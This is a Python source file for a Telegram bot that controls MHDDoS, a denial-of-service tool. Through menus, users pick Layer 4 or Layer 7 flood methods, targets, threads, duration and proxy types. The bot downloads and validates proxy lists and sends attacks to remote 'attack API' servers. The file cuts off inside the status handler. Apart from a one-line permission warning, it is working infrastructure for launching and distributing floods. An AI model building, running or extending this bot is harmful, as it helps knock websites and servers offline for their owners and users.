#!/usr/bin/env python3
"""
MHDDoS Telegram Bot Interface

A professional Telegram bot interface for MHDDoS with inline keyboard navigation.
Configure the bot token via environment variable TELEGRAM_BOT_TOKEN or config.json.
"""

import asyncio
import logging
import os
import resource
import traceback
from dataclasses import dataclass, field
from enum import Enum, auto
from http.server import BaseHTTPRequestHandler, HTTPServer
from json import JSONDecodeError, dump, load
from pathlib import Path
from socket import gethostbyname
from threading import Event, Thread, active_count
from time import time
from typing import Any, Dict, List, Optional, Tuple

from icmplib import ping as icmp_ping
from psutil import cpu_percent, net_io_counters, virtual_memory
from requests import get as requests_get, post as requests_post, exceptions as requests_exceptions
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.error import TelegramError
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from yarl import URL

# Import from start.py
from start import (
    BYTES_SEND,
    REQUESTS_SENT,
    HttpFlood,
    Layer4,
    Methods,
    ProxyManager,
    ProxyUtiles,
    Tools,
    ToolsConsole,
    con,
)
from PyRoxy import ProxyChecker, ProxyType

# Configure logging
logging.basicConfig(
    format='[%(asctime)s - %(levelname)s] %(message)s',
    datefmt="%H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(__name__)


def get_max_threads() -> int:
    """
    Get the maximum number of threads allowed by the system.
    This is important for platforms like Heroku with limited resources.
    
    Returns:
        Maximum recommended thread count based on system limits
    """
    try:
        # Try to get the soft limit for number of processes (RLIMIT_NPROC affects thread creation)
        soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NPROC)
        
        # Get current active threads
        current_threads = active_count()
        
        # Calculate available threads (leave buffer for system)
        if soft_limit == resource.RLIM_INFINITY:
            # No specific limit, use a reasonable default
            max_threads = 1000
        else:
            # Use 70% of available capacity
            available = soft_limit - current_threads
            max_threads = max(10, int(available * 0.7))
        
        logger.info(f"System thread limit: soft={soft_limit}, hard={hard_limit}, current={current_threads}, max_recommended={max_threads}")
        return max_threads
        
    except (ValueError, OSError) as e:
        logger.warning(f"Could not determine thread limit: {e}, using default 100")
        return 100


# Get system max threads on startup
SYSTEM_MAX_THREADS = get_max_threads()

__dir__ = Path(__file__).parent


# Simple HTTP server for Heroku health checks
class HealthCheckHandler(BaseHTTPRequestHandler):
    """Simple HTTP handler for Heroku port binding requirement."""
    
    def do_GET(self):
        """Handle GET requests."""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        response = """
        <!DOCTYPE html>
        <html>
        <head><title>MHDDoS Telegram Bot</title></head>
        <body>
            <h1>✅ MHDDoS Telegram Bot is Running</h1>
            <p>The bot is active and polling for updates.</p>
            <p>Use Telegram to interact with the bot.</p>
        </body>
        </html>
        """
        self.wfile.write(response.encode())
    
    def log_message(self, format, *args):
        """Suppress default request logging."""
        pass


def start_health_check_server(port: int) -> None:
    """
    Start a simple HTTP server for Heroku health checks.
    This allows the bot to run on Heroku's web dyno.
    """
    try:
        server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
        logger.info(f"Health check server listening on port {port}")
        server.serve_forever()
    except OSError as e:
        logger.error(f"Failed to start health check server on port {port}: {e}")
        logger.error("The bot will continue running, but Heroku may terminate it if PORT binding is required.")
    except Exception as e:
        logger.error(f"Unexpected error in health check server: {e}")
        logger.error(traceback.format_exc())


# Proxy type constants
PROXY_HTTP = 1
PROXY_SOCKS4 = 4
PROXY_SOCKS5 = 5
PROXY_ALL = 0
PROXY_RANDOM = 6
PROXY_NONE = -1


class BotError(Exception):
    """Custom exception for bot errors that should be shown to users."""
    pass


class ConversationState(Enum):
    """Conversation states for the bot."""
    MAIN_MENU = auto()
    SELECT_LAYER = auto()
    SELECT_METHOD = auto()
    ENTER_TARGET = auto()
    ENTER_PORT = auto()
    ENTER_THREADS = auto()
    ENTER_DURATION = auto()
    ENTER_RPC = auto()
    SELECT_PROXY_TYPE = auto()
    CONFIRM_ATTACK = auto()
    TOOLS_MENU = auto()
    TOOLS_INPUT = auto()
    PROXY_MANAGEMENT = auto()  # New state for proxy management
    API_MANAGEMENT = auto()  # State for API management
    API_ADD = auto()  # State for adding API
    SELECT_ATTACK_MODE = auto()  # State for selecting local vs API attack


@dataclass
class AttackConfig:
    """Configuration for an attack session."""
    method: str = ""
    target: str = ""
    port: int = 80
    threads: int = 100
    duration: int = 60
    rpc: int = 1
    proxy_type: int = 0
    is_layer7: bool = True
    
    # Default values stored as class attribute for consistency
    _defaults = {
        "method": "",
        "target": "",
        "port": 80,
        "threads": 100,
        "duration": 60,
        "rpc": 1,
        "proxy_type": 0,
        "is_layer7": True,
    }
    
    def reset(self):
        """Reset configuration to defaults."""
        for key, value in self._defaults.items():
            setattr(self, key, value)
    
    def copy(self) -> 'AttackConfig':
        """Create a copy of this configuration."""
        return AttackConfig(
            method=self.method,
            target=self.target,
            port=self.port,
            threads=self.threads,
            duration=self.duration,
            rpc=self.rpc,
            proxy_type=self.proxy_type,
            is_layer7=self.is_layer7
        )
    
    def validate(self) -> Tuple[bool, str]:
        """
        Validate the attack configuration.
        
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not self.method:
            return False, "Attack method not selected"
        
        if not self.target:
            return False, "Target not specified"
        
        if self.threads < 1:
            return False, "Thread count must be at least 1"
        
        if self.threads > SYSTEM_MAX_THREADS:
            return False, f"Thread count exceeds system limit ({SYSTEM_MAX_THREADS}). Please use a lower value."
        
        if self.duration < 1:
            return False, "Duration must be at least 1 second"
        
        if self.is_layer7:
            if self.rpc < 1:
                return False, "RPC must be at least 1"
        else:
            if not 1 <= self.port <= 65535:
                return False, "Port must be between 1 and 65535"
        
        return True, ""


@dataclass
class AttackSession:
    """Active attack session."""
    config: AttackConfig
    event: Event
    start_time: float
    threads: List[Thread] = field(default_factory=list)
    is_running: bool = False
    monitor_task: Optional[asyncio.Task] = None
    error_count: int = 0  # Track errors during attack
    last_error: str = ""  # Last error message


@dataclass
class ProxyStats:
    """Statistics about proxy files."""
    http_count: int = 0
    socks4_count: int = 0
    socks5_count: int = 0
    last_updated: float = 0


@dataclass
class AttackAPI:
    """Configuration for a remote Attack API endpoint."""
    name: str
    url: str
    api_key: str = ""
    enabled: bool = True
    last_check: float = 0
    is_healthy: bool = False
    max_threads: int = 0
    
    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization."""
        return {
            "name": self.name,
            "url": self.url,
            "api_key": self.api_key,
            "enabled": self.enabled,
        }
    
    @classmethod
    def from_dict(cls, data: dict) -> 'AttackAPI':
        """Create from dictionary."""
        return cls(
            name=data.get("name", ""),
            url=data.get("url", ""),
            api_key=data.get("api_key", ""),
            enabled=data.get("enabled", True),
        )


def get_proxy_file_path(proxy_type: int) -> Path:
    """Get the proxy file path based on proxy type."""
    proxy_type_names = {
        1: "http",
        4: "socks4", 
        5: "socks5",
    }
    proxy_name = proxy_type_names.get(proxy_type, "http")
    return __dir__ / f"files/proxies/{proxy_name}.txt"


def load_attack_apis() -> List[AttackAPI]:
    """Load attack APIs from config.json."""
    config_path = __dir__ / "config.json"
    apis = []
    
    try:
        if config_path.exists():
            with open(config_path) as f:
                config = load(f)
                api_list = config.get("attack-apis", [])
                for api_data in api_list:
                    apis.append(AttackAPI.from_dict(api_data))
    except Exception as e:
        logger.error(f"Error loading attack APIs: {e}")
    
    return apis


def save_attack_apis(apis: List[AttackAPI]) -> bool:
    """Save attack APIs to config.json."""
    config_path = __dir__ / "config.json"
    
    try:
        # Load existing config
        config = {}
        if config_path.exists():
            with open(config_path) as f:
                config = load(f)
        
        # Update APIs
        config["attack-apis"] = [api.to_dict() for api in apis]
        
        # Save config
        with open(config_path, "w") as f:
            dump(config, f, indent=2)
        
        return True
    except Exception as e:
        logger.error(f"Error saving attack APIs: {e}")
        return False


def check_api_health(api: AttackAPI) -> Tuple[bool, Dict[str, Any]]:
    """
    Check if an API endpoint is healthy.
    
    Returns:
        Tuple of (is_healthy, info_dict)
    """
    try:
        headers = {}
        if api.api_key:
            headers["X-API-Key"] = api.api_key
        
        response = requests_get(
            f"{api.url.rstrip('/')}/health",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return True, data
        else:
            return False, {"error": f"Status code: {response.status_code}"}
            
    except requests_exceptions.Timeout:
        return False, {"error": "Connection timeout"}
    except requests_exceptions.ConnectionError:
        return False, {"error": "Connection failed"}
    except Exception as e:
        return False, {"error": str(e)}


def get_api_info(api: AttackAPI) -> Dict[str, Any]:
    """Get detailed info from an API endpoint."""
    try:
        headers = {}
        if api.api_key:
            headers["X-API-Key"] = api.api_key
        
        response = requests_get(
            f"{api.url.rstrip('/')}/info",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            return response.json()
        else:
            return {"success": False, "error": f"Status code: {response.status_code}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}


def start_api_attack(api: AttackAPI, config: dict, proxies: Optional[List[str]] = None) -> Tuple[bool, str, str]:
    """
    Start an attack via API endpoint.
    
    Args:
        api: The API endpoint to use
        config: Attack configuration dict
        proxies: Optional list of proxy strings
    
    Returns:
        Tuple of (success, message, attack_id)
    """
    try:
        headers = {"Content-Type": "application/json"}
        if api.api_key:
            headers["X-API-Key"] = api.api_key
        
        # Add proxies to config if provided
        if proxies:
            config["proxies"] = proxies
        
        response = requests_post(
            f"{api.url.rstrip('/')}/attack/start",
            headers=headers,
            json=config,
            timeout=30
        )
        
        data = response.json()
        
        if response.status_code == 200 and data.get("success"):
            return True, data.get("message", "Attack started"), data.get("attack_id", "")
        else:
            return False, data.get("error", "Unknown error"), ""
            
    except requests_exceptions.Timeout:
        return False, "API connection timeout", ""
    except requests_exceptions.ConnectionError:
        return False, "API connection failed", ""
    except Exception as e:
        return False, str(e), ""


def stop_api_attack(api: AttackAPI, attack_id: str = "all") -> Tuple[bool, str]:
    """Stop an attack via API endpoint."""
    try:
        headers = {"Content-Type": "application/json"}
        if api.api_key:
            headers["X-API-Key"] = api.api_key
        
        response = requests_post(
            f"{api.url.rstrip('/')}/attack/stop",
            headers=headers,
            json={"attack_id": attack_id},
            timeout=30
        )
        
        data = response.json()
        
        if response.status_code == 200 and data.get("success"):
            return True, data.get("message", "Attack stopped")
        else:
            return False, data.get("error", "Unknown error")
            
    except Exception as e:
        return False, str(e)


def get_api_attack_status(api: AttackAPI, attack_id: Optional[str] = None) -> Dict[str, Any]:
    """Get attack status from API endpoint."""
    try:
        headers = {}
        if api.api_key:
            headers["X-API-Key"] = api.api_key
        
        url = f"{api.url.rstrip('/')}/attack/status"
        if attack_id:
            url += f"?attack_id={attack_id}"
        
        response = requests_get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return response.json()
        else:
            return {"success": False, "error": f"Status code: {response.status_code}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}


def get_proxy_stats() -> ProxyStats:
    """Get statistics about all proxy files."""
    stats = ProxyStats()
    
    for ptype, name in [(1, "http"), (4, "socks4"), (5, "socks5")]:
        path = get_proxy_file_path(ptype)
        if path.exists():
            try:
                count = sum(1 for line in path.open() if line.strip())
                if ptype == 1:
                    stats.http_count = count
                elif ptype == 4:
                    stats.socks4_count = count
                elif ptype == 5:
                    stats.socks5_count = count
                stats.last_updated = max(stats.last_updated, path.stat().st_mtime)
            except Exception as e:
                logger.error(f"Error reading proxy file {path}: {e}")
    
    return stats


async def update_proxy_list(proxy_type: int, threads: int = 100, force: bool = False) -> Tuple[int, str]:
    """
    Update proxy list by downloading and checking new proxies.
    
    Args:
        proxy_type: Proxy type (1=HTTP, 4=SOCKS4, 5=SOCKS5)
        threads: Number of threads for proxy checking
        force: Force update even if file exists
    
    Returns:
        Tuple of (proxy_count, status_message)
    """
    from random import choice as randchoice
    
    if proxy_type not in {1, 4, 5}:
        return 0, "Invalid proxy type. Use 1 (HTTP), 4 (SOCKS4), or 5 (SOCKS5)."
    
    proxy_li = get_proxy_file_path(proxy_type)
    proxy_type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
    
    try:
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        
        # Download proxies from config providers
        logger.info(f"Downloading {proxy_type_name} proxies...")
        proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
        
        if not proxies:
            return 0, f"Failed to download {proxy_type_name} proxies. Check your internet connection."
        
        download_count = len(proxies)
        logger.info(f"Downloaded {download_count:,} {proxy_type_name} proxies, checking...")
        
        # Check proxies
        proxies = ProxyChecker.checkAll(
            proxies, 
            timeout=5, 
            threads=min(threads, 100),  # Limit checker threads
            url="http://httpbin.org/get",
        )
        
        if not proxies:
            return 0, f"No valid {proxy_type_name} proxies found after checking. Downloaded {download_count}, but none passed validation."
        
        # Save checked proxies to file
        with proxy_li.open("w") as wr:
            for proxy in proxies:
                wr.write(str(proxy) + "\n")
        
        valid_count = len(proxies)
        logger.info(f"Saved {valid_count:,} valid {proxy_type_name} proxies to file")
        return valid_count, f"✓ {proxy_type_name}: Downloaded {download_count:,}, Valid: {valid_count:,}"
        
    except Exception as e:
        error_msg = f"Failed to update {proxy_type_name} proxies: {str(e)}"
        logger.error(error_msg)
        return 0, error_msg


async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[URL] = None) -> Tuple[Optional[set], str]:
    """
    Handle proxy list similar to CLI version.
    Downloads and checks proxies if file doesn't exist.
    
    Args:
        proxy_type: Proxy type (0=All, 1=HTTP, 4=SOCKS4, 5=SOCKS5, 6=Random)
        threads: Number of threads for proxy checking
        url: Target URL for proxy validation
    
    Returns:
        Tuple of (Set of proxies or None, status message)
    """
    from random import choice as randchoice
    
    if proxy_type not in {4, 5, 1, 0, 6}:
        return None, "Invalid proxy type"
    
    # Handle random proxy type
    if proxy_type == 6:
        proxy_type = randchoice([4, 5, 1])
    
    proxy_li = get_proxy_file_path(proxy_type)
    proxy_type_name = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
    
    if not proxy_li.exists():
        logger.info(f"Proxy file doesn't exist, downloading {proxy_type_name} proxies...")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        
        try:
            # Download proxies from config providers
            proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
            if not proxies:
                return None, f"Failed to download {proxy_type_name} proxies"
                
            download_count = len(proxies)
            logger.info(f"Downloaded {download_count:,} proxies, checking...")
            
            # Check proxies
            proxies = ProxyChecker.checkAll(
                proxies, 
                timeout=5, 
                threads=min(threads, 100),
                url=url.human_repr() if url else "http://httpbin.org/get",
            )
            
            if not proxies:
                return None, f"No valid {proxy_type_name} proxies found after checking ({download_count} downloaded)"
            
            # Save checked proxies to file
            with proxy_li.open("w") as wr:
                for proxy in proxies:
                    wr.write(str(proxy) + "\n")
            
            logger.info(f"Saved {len(proxies):,} valid proxies to file")
            return proxies, f"Downloaded and validated {len(proxies):,} {proxy_type_name} proxies"
            
        except Exception as e:
            error_msg = f"Failed to download/check proxies: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    
    # Read existing proxies from file
    try:
        proxies = ProxyUtiles.readFromFile(proxy_li)
        if proxies:
            logger.info(f"Loaded {len(proxies):,} proxies from file")
            return proxies, f"Loaded {len(proxies):,} {proxy_type_name} proxies"
        else:
            return None, f"Empty proxy file for {proxy_type_name}"
    except Exception as e:
        error_msg = f"Failed to read proxy file: {str(e)}"
        logger.error(error_msg)
        return None, error_msg


class MHDDoSBot:
    """Main Telegram Bot class for MHDDoS."""
    
    def __init__(self, token: str, allowed_users: Optional[List[int]] = None):
        self.token = token
        self.allowed_users = allowed_users or []
        self.user_configs: Dict[int, AttackConfig] = {}
        self.active_sessions: Dict[int, AttackSession] = {}
        self.user_tools_context: Dict[int, str] = {}
        self.user_state_context: Dict[int, str] = {}  # Track which state user is in for text input
        self.attack_apis: List[AttackAPI] = load_attack_apis()  # Load registered APIs
        self.api_attack_ids: Dict[int, Dict[str, str]] = {}  # user_id -> {api_name: attack_id}
        self.user_api_context: Dict[int, str] = {}  # Track API-related text input context
        
    def get_user_config(self, user_id: int) -> AttackConfig:
        """Get or create user configuration."""
        if user_id not in self.user_configs:
            self.user_configs[user_id] = AttackConfig()
        return self.user_configs[user_id]
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user is authorized to use the bot."""
        if not self.allowed_users:
            return True
        return user_id in self.allowed_users
    
    def get_enabled_apis(self) -> List[AttackAPI]:
        """Get list of enabled APIs."""
        return [api for api in self.attack_apis if api.enabled]
    
    def add_api(self, api: AttackAPI) -> bool:
        """Add a new API endpoint."""
        # Check for duplicate names
        for existing in self.attack_apis:
            if existing.name == api.name:
                return False
        
        self.attack_apis.append(api)
        save_attack_apis(self.attack_apis)
        return True
    
    def remove_api(self, name: str) -> bool:
        """Remove an API endpoint by name."""
        for i, api in enumerate(self.attack_apis):
            if api.name == name:
                del self.attack_apis[i]
                save_attack_apis(self.attack_apis)
                return True
        return False
    
    def toggle_api(self, name: str) -> Optional[bool]:
        """Toggle API enabled status. Returns new status or None if not found."""
        for api in self.attack_apis:
            if api.name == name:
                api.enabled = not api.enabled
                save_attack_apis(self.attack_apis)
                return api.enabled
        return None
    
    async def send_error(self, update: Update, error_msg: str, show_menu: bool = True) -> None:
        """Send error message to user with optional main menu."""
        text = f"⚠️ Error: {error_msg}"
        keyboard = self.get_main_menu_keyboard() if show_menu else None
        
        try:
            if update.callback_query:
                await update.callback_query.edit_message_text(text, reply_markup=keyboard)
            elif update.message:
                await update.message.reply_text(text, reply_markup=keyboard)
        except TelegramError as e:
            logger.error(f"Failed to send error message: {e}")
    
    async def safe_edit_message(self, query, text: str, reply_markup=None) -> bool:
        """Safely edit a message, handling Telegram API errors."""
        try:
            await query.edit_message_text(text, reply_markup=reply_markup)
            return True
        except TelegramError as e:
            logger.error(f"Failed to edit message: {e}")
            return False
    
    async def safe_reply(self, message, text: str, reply_markup=None) -> bool:
        """Safely reply to a message, handling Telegram API errors."""
        try:
            await message.reply_text(text, reply_markup=reply_markup)
            return True
        except TelegramError as e:
            logger.error(f"Failed to send reply: {e}")
            return False
    
    # Keyboard generators
    def get_main_menu_keyboard(self) -> InlineKeyboardMarkup:
        """Generate main menu keyboard."""
        # Count enabled APIs
        enabled_apis = len(self.get_enabled_apis())
        api_text = f"🌐 API Manager ({enabled_apis})" if enabled_apis > 0 else "🌐 API Manager"
        
        keyboard = [
            [
                InlineKeyboardButton("🔥 Layer 7", callback_data="layer_7"),
                InlineKeyboardButton("💥 Layer 4", callback_data="layer_4"),
            ],
            [
                InlineKeyboardButton("🔧 Tools", callback_data="tools"),
                InlineKeyboardButton("📊 Status", callback_data="status"),
            ],
            [
                InlineKeyboardButton("🔄 Proxy Manager", callback_data="proxy_manager"),
                InlineKeyboardButton(api_text, callback_data="api_manager"),
            ],
            [InlineKeyboardButton("❓ Help", callback_data="help")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_layer7_methods_keyboard(self) -> InlineKeyboardMarkup:
        """Generate Layer 7 methods keyboard."""
        methods = sorted(Methods.LAYER7_METHODS)
        keyboard = []
        row = []
        for i, method in enumerate(methods):
            row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_layer4_methods_keyboard(self) -> InlineKeyboardMarkup:
        """Generate Layer 4 methods keyboard."""
        methods = sorted(Methods.LAYER4_METHODS)
        keyboard = []
        row = []
        for i, method in enumerate(methods):
            row.append(InlineKeyboardButton(method, callback_data=f"method_{method}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_proxy_type_keyboard(self) -> InlineKeyboardMarkup:
        """Generate proxy type selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("HTTP", callback_data="proxy_1"),
                InlineKeyboardButton("SOCKS4", callback_data="proxy_4"),
            ],
            [
                InlineKeyboardButton("SOCKS5", callback_data="proxy_5"),
                InlineKeyboardButton("Random", callback_data="proxy_6"),
            ],
            [
                InlineKeyboardButton("All Types", callback_data="proxy_0"),
                InlineKeyboardButton("No Proxy", callback_data="proxy_none"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_threads_keyboard(self) -> InlineKeyboardMarkup:
        """Generate thread count selection keyboard with system limits."""
        # Dynamically adjust buttons based on system limit
        max_threads = SYSTEM_MAX_THREADS
        
        options = [50, 100, 200, 500, 1000]
        # Filter options that exceed system limit
        valid_options = [o for o in options if o <= max_threads]
        
        keyboard = []
        row = []
        for opt in valid_options:
            row.append(InlineKeyboardButton(str(opt), callback_data=f"threads_{opt}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        
        if row:
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("Custom", callback_data="threads_custom")])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_threads_prompt(self) -> str:
        """Get the threads prompt message with system limit info."""
        return f"Select thread count:\n\n⚠️ System max threads: {SYSTEM_MAX_THREADS}\n(Based on current system limits)"
    
    def get_duration_keyboard(self) -> InlineKeyboardMarkup:
        """Generate duration selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("30s", callback_data="duration_30"),
                InlineKeyboardButton("60s", callback_data="duration_60"),
                InlineKeyboardButton("120s", callback_data="duration_120"),
            ],
            [
                InlineKeyboardButton("300s", callback_data="duration_300"),
                InlineKeyboardButton("600s", callback_data="duration_600"),
                InlineKeyboardButton("Custom", callback_data="duration_custom"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_rpc_keyboard(self) -> InlineKeyboardMarkup:
        """Generate RPC selection keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("1", callback_data="rpc_1"),
                InlineKeyboardButton("5", callback_data="rpc_5"),
                InlineKeyboardButton("10", callback_data="rpc_10"),
            ],
            [
                InlineKeyboardButton("50", callback_data="rpc_50"),
                InlineKeyboardButton("100", callback_data="rpc_100"),
                InlineKeyboardButton("Custom", callback_data="rpc_custom"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_confirm_keyboard(self) -> InlineKeyboardMarkup:
        """Generate confirmation keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("✅ Start Attack", callback_data="confirm_start"),
                InlineKeyboardButton("❌ Cancel", callback_data="confirm_cancel"),
            ],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_tools_keyboard(self) -> InlineKeyboardMarkup:
        """Generate tools menu keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("🌐 INFO", callback_data="tool_info"),
                InlineKeyboardButton("📡 PING", callback_data="tool_ping"),
            ],
            [
                InlineKeyboardButton("✔️ CHECK", callback_data="tool_check"),
                InlineKeyboardButton("📊 DSTAT", callback_data="tool_dstat"),
            ],
            [
                InlineKeyboardButton("🎮 TSSRV", callback_data="tool_tssrv"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_proxy_manager_keyboard(self) -> InlineKeyboardMarkup:
        """Generate proxy manager keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("📋 View Stats", callback_data="proxy_stats"),
            ],
            [
                InlineKeyboardButton("🔄 Update HTTP", callback_data="proxy_update_1"),
                InlineKeyboardButton("🔄 Update SOCKS4", callback_data="proxy_update_4"),
            ],
            [
                InlineKeyboardButton("🔄 Update SOCKS5", callback_data="proxy_update_5"),
                InlineKeyboardButton("🔄 Update All", callback_data="proxy_update_all"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_api_manager_keyboard(self) -> InlineKeyboardMarkup:
        """Generate API manager keyboard."""
        keyboard = [
            [
                InlineKeyboardButton("📋 List APIs", callback_data="api_list"),
                InlineKeyboardButton("➕ Add API", callback_data="api_add"),
            ],
            [
                InlineKeyboardButton("🔍 Check All APIs", callback_data="api_check_all"),
            ],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_api_detail_keyboard(self, api_name: str, is_enabled: bool) -> InlineKeyboardMarkup:
        """Generate API detail keyboard."""
        toggle_text = "⏸️ Disable" if is_enabled else "▶️ Enable"
        keyboard = [
            [
                InlineKeyboardButton("🔍 Check Health", callback_data=f"api_check_{api_name}"),
                InlineKeyboardButton(toggle_text, callback_data=f"api_toggle_{api_name}"),
            ],
            [
                InlineKeyboardButton("🗑️ Remove", callback_data=f"api_remove_{api_name}"),
            ],
            [InlineKeyboardButton("⬅️ Back to API List", callback_data="api_list")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_attack_mode_keyboard(self) -> InlineKeyboardMarkup:
        """Generate attack mode selection keyboard."""
        enabled_apis = self.get_enabled_apis()
        
        keyboard = [
            [InlineKeyboardButton("🖥️ Local Attack", callback_data="attack_mode_local")],
        ]
        
        if enabled_apis:
            keyboard.append([
                InlineKeyboardButton(f"🌐 API Attack ({len(enabled_apis)} APIs)", callback_data="attack_mode_api"),
            ])
            keyboard.append([
                InlineKeyboardButton("🔀 All (Local + APIs)", callback_data="attack_mode_all"),
            ])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_stop_keyboard(self) -> InlineKeyboardMarkup:
        """Generate stop attack keyboard."""
        keyboard = [
            [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
            [InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_status")],
            [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def format_config_summary(self, config: AttackConfig) -> str:
        """Format attack configuration summary."""
        layer = "Layer 7" if config.is_layer7 else "Layer 4"
        proxy_names = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "Random", -1: "None"}
        proxy = proxy_names.get(config.proxy_type, str(config.proxy_type))
        
        # Add warning if threads exceed recommended limit
        thread_warning = ""
        if config.threads > SYSTEM_MAX_THREADS * 0.8:
            thread_warning = f"\n⚠️ High thread count (limit: {SYSTEM_MAX_THREADS})"
        
        summary = f"""
📋 Attack Configuration:
------------------------
🎯 Layer: {layer}
⚡ Method: {config.method}
🌐 Target: {config.target}
🔌 Port: {config.port}
🧵 Threads: {config.threads}{thread_warning}
⏱️ Duration: {config.duration}s"""
        
        if config.is_layer7:
            summary += f"""
🔄 RPC: {config.rpc}
🔒 Proxy Type: {proxy}"""
        
        return summary
    
    # Command handlers
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """Handle /start command."""
        try:
            user_id = update.effective_user.id
            
            if not self.is_authorized(user_id):
                await update.message.reply_text("⛔ You are not authorized to use this bot.")
                return ConversationHandler.END
            
            self.get_user_config(user_id).reset()
            self.user_state_context[user_id] = ""
            
            welcome_text = f"""
🚀 MHDDoS Telegram Bot Interface

Select an option from the menu below to begin.

ℹ️ System Info:
• Max Threads: {SYSTEM_MAX_THREADS}
• Active Threads: {active_count()}

⚠️ Warning: Only use this tool on systems you own or have explicit permission to test.
"""
            await update.message.reply_text(
                welcome_text,
                reply_markup=self.get_main_menu_keyboard()
            )
            return ConversationState.MAIN_MENU.value
        except Exception as e:
            logger.error(f"Error in start_command: {e}\n{traceback.format_exc()}")
            await self.safe_reply(update.message, f"⚠️ Error starting bot: {str(e)}")
            return ConversationHandler.END
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /help command."""
        help_text = f"""
📖 MHDDoS Bot Commands:

/start - Start the bot and show main menu
/help - Show this help message
/status - Show current attack status
/stop - Stop all running attacks

🎮 Navigation:
• Use inline buttons to navigate
• Select attack layer (L4/L7)
• Choose attack method
• Configure parameters
• Confirm and start attack

🔥 Layer 7 Methods: HTTP-based attacks
💥 Layer 4 Methods: TCP/UDP-based attacks

🔧 Tools:
• INFO: Get IP information
• PING: Ping target
• CHECK: Check website status
• DSTAT: Network statistics
• TSSRV: TeamSpeak SRV resolver

🔄 Proxy Manager:
• View proxy statistics
• Update/refresh proxy lists

🌐 API Manager:
• Add remote Attack API servers
• Distribute attacks across multiple instances
• Check API health status

⚙️ System Limits:
• Max Threads: {SYSTEM_MAX_THREADS}
"""
        await update.message.reply_text(help_text)
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /status command."""
        try:
            user_id = update.effective_user.id
            
            if user_id not in self.active_sessions:
                await update.message.reply_text("📭 No active attacks.", reply_markup=self.get_main_menu_keyboard())
                return
            
            session = self.active_sessions[user_id]
            if not session.is_running:
                await update.message.reply_text("📭 No active attacks.", reply_markup=self.get_main_menu_keyboard())
                return
            
            elapsed = int(time() - session.start_time)
            remaining = max(0, session.config.duration - elapsed)
            progress = min(100, int((elapsed / session.config.duration) * 100))
            progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
            
            error_info = ""
            if session.error_count > 0:
                error_info = f"\n⚠️ Errors: {session.error_count}"
                if session.last_error:
                    error_info += f"\n📛 Last: {session.last_error[:50]}"
            
            status_text = f"""
📊 Attack Status:
-----------------
